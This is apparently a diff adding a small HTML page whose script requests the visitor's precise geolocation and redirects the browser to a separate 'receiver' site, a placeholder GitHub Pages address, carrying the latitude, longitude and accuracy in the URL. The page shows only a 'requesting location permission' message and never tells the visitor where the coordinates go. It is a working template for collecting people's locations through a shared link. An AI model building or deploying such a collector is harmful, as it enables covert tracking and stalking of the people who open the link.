@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h3 id="status">📍 Requesting location permission…</h3>
+
+<script>
+navigator.geolocation.getCurrentPosition(
+  pos => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const acc = pos.coords.accuracy;
+
+    // CHANGE URL AFTER CREATING RECEIVER SITE
+    const receiver =
+      "https://YOUR_USERNAME.github.io/location-receiver/receiver.html";
+
+    window.location.href =
+      `${receiver}?lat=${lat}&lon=${lon}&acc=${acc}`;
+  },
+  () => {
+    document.getElementById("status").innerText =
+      "❌ Location permission denied";
+  },
+  { enableHighAccuracy: true }
+);
+</script>
+
+</body>
+</html>
